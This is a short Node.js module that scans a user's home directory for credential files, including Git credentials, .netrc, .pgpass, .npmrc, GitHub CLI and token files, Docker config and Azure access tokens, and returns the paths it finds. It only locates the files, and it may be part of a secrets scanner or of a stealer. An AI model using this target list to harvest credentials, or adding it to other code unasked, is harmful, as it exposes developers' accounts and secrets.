const fs = require('fs');
const path = require('path');

// Process 2: Scan single files
async function scanSingleFiles(homeDir) {
  const vulnerableFiles = [];
  
  const singleFiles = [
    path.join(homeDir, '.git-credentials'),
    path.join(homeDir, '.netrc'),
    path.join(homeDir, '.pgpass'),
    path.join(homeDir, '.npmrc'),
    path.join(homeDir, '.config', 'gh', 'hosts.yml'),
    path.join(homeDir, '.docker', 'config.json'),
    path.join(homeDir, '.azure', 'accessTokens.json'),
    path.join(homeDir, '.azure', 'azureProfile.json'),
    // GitHub-specific token files
    path.join(homeDir, '.github_token'),
    path.join(homeDir, '.github-token'),
    path.join(homeDir, 'github_token.txt'),
    path.join(homeDir, 'github-token.txt'),
    path.join(homeDir, '.config', 'hub'), // GitHub CLI legacy
    path.join(homeDir, '.config', 'gh', 'config.yml')
  ];
  
  for (const filePath of singleFiles) {
    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      vulnerableFiles.push({
        path: filePath,
        type: 'file',
        encrypted: filePath.includes('_cyphered')
      });
    }
  }
  
  console.log('Single files scan found:', vulnerableFiles.length, 'files');
  return vulnerableFiles;
}

module.exports = { scanSingleFiles };